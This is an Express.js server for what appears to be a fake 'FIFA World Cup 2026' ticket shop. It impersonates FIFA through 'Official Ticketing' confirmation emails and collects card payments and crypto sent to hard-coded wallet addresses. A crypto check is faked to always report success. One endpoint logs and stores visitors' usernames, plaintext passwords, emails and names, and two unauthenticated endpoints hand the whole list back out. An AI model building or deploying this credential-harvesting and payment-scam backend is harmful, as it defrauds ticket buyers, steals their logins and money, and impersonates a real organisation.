const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// In-memory storage
const transactions = [];
const userCredentials = [];

// Crypto Config
const CRYPTO_ADDRESSES = {
    'USDT_TRC20': 'TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6',
    'SOL': 'BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd',
    'BTC': 'bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw',
    'ETH': '0x7978f226bbce9f03cac5c6d32526291a776b7436',
    'USDT_ERC20': '0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47'
};

const CRYPTO_NETWORKS = {
    'USDT_TRC20': 'TRC20 Network',
    'SOL': 'SOLANA Network',
    'BTC': 'Bitcoin Network',
    'ETH': 'Ethereum ERC20 Network',
    'USDT_ERC20': 'Ethereum ERC20 Network'
};

function generateTransactionId() {
    return 'FIFA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function validateTransactionId(txnId, cryptoType) {
    // Simple validation to allow testing
    return txnId.length > 5;
}

// --- API ENDPOINTS ---

app.get('/', (req, res) => {
    res.json({ status: 'System Running', email_system: 'Elastic Email API' });
});

app.get('/api/stripe-config', (req, res) => {
    res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
});

app.get('/api/crypto-addresses', (req, res) => {
    res.json({
        success: true,
        addresses: CRYPTO_ADDRESSES,
        networks: CRYPTO_NETWORKS
    });
});

// ✅ RESTORED: Detailed Credential Storage Logic
app.post('/api/store-credentials', (req, res) => {
    try {
        const { username, password, email, name } = req.body;
        
        console.log('🔐 Storing credentials:', { username, password, email, name });
        
        // Check if user already exists
        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
        
        if (existingUserIndex !== -1) {
            // Update existing user
            userCredentials[existingUserIndex] = {
                username,
                password, 
                email,
                name,
                timestamp: new Date().toISOString()
            };
        } else {
            // Add new user
            userCredentials.push({
                username,
                password, 
                email,
                name,
                timestamp: new Date().toISOString()
            });
        }
        
        console.log('✅ Credentials stored successfully');
        
        res.json({
            success: true,
            message: 'Credentials stored successfully'
        });
        
    } catch (error) {
        console.error('❌ Error storing credentials:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// Retrieve password endpoint (for admin use)
app.get('/api/get-password/:username', (req, res) => {
    try {
        const { username } = req.params;
        const user = userCredentials.find(u => u.username === username);
        
        if (user) {
            res.json({
                success: true,
                username: user.username,
                password: user.password, 
                email: user.email,
                name: user.name,
                timestamp: user.timestamp
            });
        } else {
            res.status(404).json({ success: false, message: 'User not found' });
        }
    } catch (error) {
        console.error('❌ Error retrieving password:', error);
        res.json({ success: false, message: error.message });
    }
});

// Get all users (for admin use)
app.get('/api/all-users', (req, res) => {
    try {
        res.json({
            success: true,
            count: userCredentials.length,
            users: userCredentials
        });
    } catch (error) {
        console.error('❌ Error retrieving users:', error);
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer, tickets } = req.body;
        
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Tickets (${tickets.length})`,
            receipt_email: customer.email
        });

        res.json({
            success: true,
            clientSecret: paymentIntent.client_secret
        });
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/verify-crypto', async (req, res) => {
    // Simulate successful verification for demo
    const { transactionId, cryptoType } = req.body;
    res.json({
        success: true,
        verified: true,
        transactionId: transactionId,
        message: 'Verified'
    });
});

// ✅ NEW EMAIL SENDING FUNCTION (Using Elastic Email API)
app.post('/api/send-confirmation', async (req, res) => {
    try {
        const { customer, tickets, payment, transactionId } = req.body;
        
        console.log('📧 Sending email via Elastic Email to:', customer.email);

        // 1. Generate HTML
        const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);

        // 2. Respond to Frontend immediately (Non-blocking)
        res.json({ success: true, message: 'Confirmation sent' });

        // 3. Send via Elastic Email API (Background)
        sendEmailViaElastic(customer.email, `Ticket Confirmation #${transactionId}`, emailHtml)
            .then(response => {
                console.log('✅ Elastic Email Response:', response);
            })
            .catch(err => {
                console.error('❌ Elastic Email Failed:', err);
            });

    } catch (error) {
        console.error('Server Error:', error);
        if (!res.headersSent) {
            res.json({ success: true, message: 'Processed (Email skipped due to error)' });
        }
    }
});

// Helper function to send via Elastic Email API (Using native fetch)
async function sendEmailViaElastic(to, subject, html) {
    const apiKey = process.env.ELASTIC_EMAIL_API_KEY;
    const fromEmail = process.env.ELASTIC_EMAIL_FROM;

    if (!apiKey || !fromEmail) {
        throw new Error("Missing Elastic Email API Key or From Address");
    }

    const params = new URLSearchParams();
    params.append('apikey', apiKey);
    params.append('from', fromEmail);
    params.append('fromName', 'FIFA World Cup 2026');
    params.append('to', to);
    params.append('subject', subject);
    params.append('bodyHtml', html);
    params.append('isTransactional', 'true');

    const response = await fetch('https://api.elasticemail.com/v2/email/send', {
        method: 'POST',
        body: params
    });

    return await response.json();
}

// HTML Generator (The FIFA Template you wanted)
function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
    const ticketList = tickets.map(t => {
        const qty = t.quantity || 1;
        const price = t.price || 0;
        const total = price * qty;

        return `
        <div style="border: 1px solid #e0e0e0; border-radius: 8px; margin-bottom: 15px; overflow: hidden;">
            <div style="background-color: #1a1a2e; color: white; padding: 10px 15px; font-size: 16px; font-weight: bold;">
                🎫 ${t.match.teams}
            </div>
            <div style="padding: 15px; background-color: #ffffff;">
                <p style="margin: 5px 0; color: #666;"><strong>Date:</strong> ${t.match.date}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Venue:</strong> ${t.match.venue}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Category:</strong> ${t.category.name}</p>
                <div style="margin-top: 10px; border-top: 1px solid #eee; padding-top: 10px;">
                    <p style="margin: 0;"><strong>Quantity:</strong> ${qty}</p>
                    <p style="margin: 0; font-size: 1.1em; color: #1a1a1a;"><strong>Price:</strong> USD ${total.toLocaleString()}</p>
                </div>
            </div>
        </div>`;
    }).join('');

    return `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; }
            .container { max-width: 600px; margin: 0 auto; background: #ffffff; }
            .header { background-color: #1a1a2e; color: #ffffff; padding: 30px 20px; text-align: center; }
            .content { padding: 30px 20px; }
            .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #888; }
            .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
            .btn { display: inline-block; background-color: #1a1a2e; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">🎉 FIFA World Cup 2026™</div>
                <div style="font-size: 18px; opacity: 0.9;">Your Ticket Purchase Confirmation</div>
            </div>
            
            <div class="content">
                <p>Dear <strong>${customer.name}</strong>,</p>
                <p>Thank you for your purchase! Your tickets have been confirmed and are detailed below.</p>
                
                <h3 style="border-bottom: 2px solid #1a1a2e; padding-bottom: 10px; margin-top: 30px;">📋 Order Summary</h3>
                ${ticketList}
                
                <div style="background-color: #1a1a2e; color: white; padding: 20px; border-radius: 8px; margin-top: 30px;">
                    <h3 style="margin-top: 0; margin-bottom: 15px;">💰 Payment Details</h3>
                    <p style="margin: 5px 0; opacity: 0.9;">Payment Method: <strong>${paymentMethod === 'card' ? 'Credit/Debit Card' : payment.cryptoType}</strong></p>
                    <p style="margin: 5px 0; opacity: 0.9;">Transaction ID: <span style="font-family: monospace;">${transactionId}</span></p>
                    <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.2); margin: 15px 0;">
                    <p style="margin: 0; font-size: 18px; font-weight: bold;">Total Paid: USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
                </div>

                <h3 style="margin-top: 30px;">📱 Next Steps</h3>
                <p>Your tickets will be available in your FIFA account 48 hours before the match. You'll receive another email with download instructions.</p>
                
                <p><strong>Need Help?</strong><br>Contact FIFA Ticketing Support: <a href="mailto:ticketing@fifa.org" style="color: #1a1a2e;">ticketing@fifa.org</a></p>
            </div>
            
            <div class="footer">
                <p>FIFA World Cup 2026™ Official Ticketing</p>
                <p>This is an automated message. Please do not reply to this email.</p>
            </div>
        </div>
    </body>
    </html>
    `;
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
